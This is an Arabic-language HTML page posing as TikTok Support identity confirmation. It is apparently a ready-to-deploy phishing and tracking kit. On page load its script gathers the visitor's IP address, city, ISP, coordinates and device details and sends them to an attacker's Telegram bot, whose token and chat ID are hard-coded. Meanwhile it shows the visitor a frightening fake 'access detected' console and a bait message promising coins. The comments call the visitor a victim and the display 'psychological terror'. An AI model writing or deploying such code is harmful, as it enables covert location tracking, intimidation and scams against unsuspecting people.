<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Support - تأكيد الهوية</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        #console { width: 90%; max-width: 600px; padding: 20px; border: 1px solid #0f0; box-shadow: 0 0 20px #0f0; background: rgba(0, 20, 0, 0.9); }
        .loading-bar { width: 0%; height: 5px; background: #0f0; margin-top: 10px; transition: width 0.5s; }
        .warning { color: red; font-weight: bold; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
    </style>
</head>
<body>

<div id="console">
    <p class="warning">⚠️ تم اكتشاف محاولة وصول لنظام الرشق...</p>
    <p id="details">جاري فحص الجهاز...</p>
    <div class="loading-bar" id="bar"></div>
    <p id="status">جاري الاتصال بالسيرفر...</p>
</div>

<script>
    // كود سحب البيانات وإرسالها للتليجرام
    const botToken = '6872535039:AAGW-x0oE_9B2W8_19L3y0uX6u_X-W_E'; // حط توكن بوتك هنا
    const chatId = '6547631855'; // حط ايديك هنا

    async function getExtraInfo() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            
            // تحديث الشاشة للضحية (الرعب النفسي)
            document.getElementById('details').innerHTML = `
                الجهاز: ${navigator.platform} <br>
                النظام: ${navigator.userAgent.split(' ')[1]} <br>
                العنوان الرقمي: ${data.ip} <br>
                الموقع: ${data.city}, ${data.country_name} <br>
                المزود: ${data.org}
            `;

            // إرسال البيانات لك في التليجرام
            const message = `
🔥 صيدة جديدة يا معلم!
📍 المدينة: ${data.city}
🌐 الشركة: ${data.org}
🔢 الـ IP: ${data.ip}
📱 الجهاز: ${navigator.userAgent}
🗺️ الخريطة: https://www.google.com/maps?q=${data.latitude},${data.longitude}
            `;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat-id=${chatId}&text=${encodeURIComponent(message)}`);

        } catch (error) {
            console.log('Error fetching info');
        }
    }

    // أنيميشن التحميل
    let width = 0;
    const bar = document.getElementById('bar');
    const status = document.getElementById('status');
    const interval = setInterval(() => {
        if (width >= 100) {
            clearInterval(interval);
            status.innerHTML = "✅ تم تأكيد الموقع.. اضغط 'سماح' لاستلام العملات";
            status.style.color = "white";
        } else {
            width += 10;
            bar.style.width = width + "%";
        }
    }, 800);

    getExtraInfo();
</script>

</body>
</html>
